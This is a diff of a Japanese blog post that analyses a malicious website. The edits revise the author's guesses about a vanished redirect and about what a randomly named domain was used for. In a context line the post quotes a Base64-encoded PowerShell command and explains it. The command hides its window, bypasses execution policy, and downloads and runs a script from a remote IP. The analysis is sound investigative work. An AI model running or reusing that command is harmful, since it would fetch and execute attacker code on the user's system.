@@ -7,7 +7,7 @@
 
 サイトが閉鎖されていたので、まずWayback Machineでクローラーが記録を残していないか確認することにした。すると、「mvjfkakfkfkaiai[.]com」へのリダイレクトがあることに気づいた。このケースをまとめるのが約一ヶ月遅れてしまったせいか、今現在Wayback Machineではそのリダイレクトは確認できなくなっている。<br>
 **今Wayback Machineでdkaksdaksortor[.]comを確認すると、403 Forbiddenエラーが返ってくる。**<br>
-**なぜリダイレクトが消えたのか完全にはわからないが、関連していた.jsファイルが削除されたことで、Waybackがそこへのリンクをたどれなくなったためかもしれない。**<br>
+**なぜリダイレクトが消えたのか完全にはわからないが、Waybackがクロールした際に関連していたものが期限切れになったか削除されたことで、Waybackがそこへのリンクをたどれなくなったのかもしれない。**<br>
 **あくまでも自分なりの推測だが。**
 
 mvjfkakfkfkaiai[.]comにアクセスすると、404エラーが返ってくる。
@@ -71,7 +71,7 @@ Base64：cG93ZXJzaGVsbCAtd2kgbWkgLUVQIEIgLWMgaWV4KGlybSAxOTMuMTExLjExNy4yMjYvVi5
 ・iex(irm IP/ファイル) で対象IPからリモートスクリプトをダウンロードして即実行
 
 これで、例の怪しいウェブシェルが確実に悪意あるものだと証明できた。<br>
-また、ランダムな文字列というドメイン名の特徴から、dkaksdaksortor[.]comもmvjfkakfkfkaiai[.]comと同じように悪意あるJavaScriptコードを置くために使われていたと考えるのが自然だろう。
+また、ランダムな文字列というドメイン名の特徴から、dkaksdaksortor[.]comもmvjfkakfkfkaiai[.]comと同じように悪意あるJavaScriptコードを置くために使われていた可能性が高い。もしくは、メールや何らかのサイトのポップアップに使われたフィッシング広告の窓口だったとも考えられる。
 
 ただ、もっと深掘りできるはず。……できるよね？<br>
 本当に欲しかったのはHTMLではなく、PHPのコードそのものだった。<br>
